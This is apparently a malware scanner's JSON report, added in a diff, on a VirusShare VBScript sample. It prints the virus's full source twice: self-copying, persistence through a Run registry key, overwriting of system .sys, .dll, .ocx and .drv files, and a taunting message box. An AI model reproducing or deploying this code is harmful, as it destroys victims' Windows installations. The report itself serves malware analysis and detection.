@@ -1,0 +1,68 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Command": "May run PowerShell commands",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "write": "May write to a file"
+        },
+        "macro": "'VBS.Io By Dr.T/BCVG 2001 \nOn Error Resume Next \nDim fso, file, vbscopy, wscr, f, finee, ext, ap, s, dirwin, dirsys \nSet fso = CreateObject(\"Scripting.FileSystemObject\") \nset file = fso.OpenTextFile(WScript.ScriptFullname,1) \nvbscopy=file.ReadAll \nSet dirwin = fso.GetSpecialFolder(0) \nSet dirsys = fso.GetSpecialFolder(1) \nSet c = fso.GetFile(WScript.ScriptFullName) \nc.Copy(dirwin &\"\\Command\\MSNetLog.vbs\") \nset regedit = createobject(\"WScript.Shell\") \nregedit.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSNetLog\",dirwin&\"\\Command\\logMS.vbs\" \nset f = fso.GetFolder(dirsys) \nset fc = f.Files \nfor each finee in fc \next=fso.GetExtensionName(finee.path) \next=lcase(ext) \ns=lcase(finee.name) \nif (ext=\"sys\") or (ext=\"dll\") or (ext=\"ocx\") or (ext=\"drv\") then \nset ap=fso.OpenTextFile(finee.path,2,true) \nap.write vbscopy \nap.close \nset att=fso.GetFile(finee.path) \natt.attributes=att.attributes+2 \nend if \nnext \nif Day(Now) = 2 or Day(Now) = 10 or Day(Now) = 12 or Day(Now) = 16 or Day(Now) = 28 then \nMsgBox \"Fermats Last Theorem THE PROOF : y^2 = ax^3 + bx^2 + cx + d is an elliptic curve, we need to prove that every elliptic curve is modular and it is very complex and since you were infected by PHP.IoBaracuda virus you are an idiot!! And  you will not understand the proof. Sorry\", 16 \nend if "
+    },
+    "filename": "VirusShare_429804dffd47f286ae12f76233bd2c39",
+    "filesize": 1358,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "429804dffd47f286ae12f76233bd2c39",
+        "sha1": "49407d4925b9e94a144b43460292fb52d9f50abb",
+        "sha256": "93a47354086d6cbf211cfb903ced1eae99081dccbc39a071a50abc02f8983860"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'VBS.Io By Dr.T/BCVG 2001 ",
+            "On Error Resume Next ",
+            "Dim fso, file, vbscopy, wscr, f, finee, ext, ap, s, dirwin, dirsys ",
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\") ",
+            "set file = fso.OpenTextFile(WScript.ScriptFullname,1) ",
+            "vbscopy=file.ReadAll ",
+            "Set dirwin = fso.GetSpecialFolder(0) ",
+            "Set dirsys = fso.GetSpecialFolder(1) ",
+            "Set c = fso.GetFile(WScript.ScriptFullName) ",
+            "c.Copy(dirwin &\"\\Command\\MSNetLog.vbs\") ",
+            "set regedit = createobject(\"WScript.Shell\") ",
+            "regedit.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSNetLog\",dirwin&\"\\Command\\logMS.vbs\" ",
+            "set f = fso.GetFolder(dirsys) ",
+            "set fc = f.Files ",
+            "for each finee in fc ",
+            "ext=fso.GetExtensionName(finee.path) ",
+            "ext=lcase(ext) ",
+            "s=lcase(finee.name) ",
+            "if (ext=\"sys\") or (ext=\"dll\") or (ext=\"ocx\") or (ext=\"drv\") then ",
+            "set ap=fso.OpenTextFile(finee.path,2,true) ",
+            "ap.write vbscopy ",
+            "ap.close ",
+            "set att=fso.GetFile(finee.path) ",
+            "att.attributes=att.attributes+2 ",
+            "end if ",
+            "next ",
+            "if Day(Now) = 2 or Day(Now) = 10 or Day(Now) = 12 or Day(Now) = 16 or Day(Now) = 28 then ",
+            "MsgBox \"Fermats Last Theorem THE PROOF : y^2 = ax^3 + bx^2 + cx + d is an elliptic curve, we need to prove that every elliptic curve is modular and it is very complex and since you were infected by PHP.IoBaracuda virus you are an idiot!! And  you will not understand the proof. Sorry\", 16 ",
+            "end if "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.274967",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
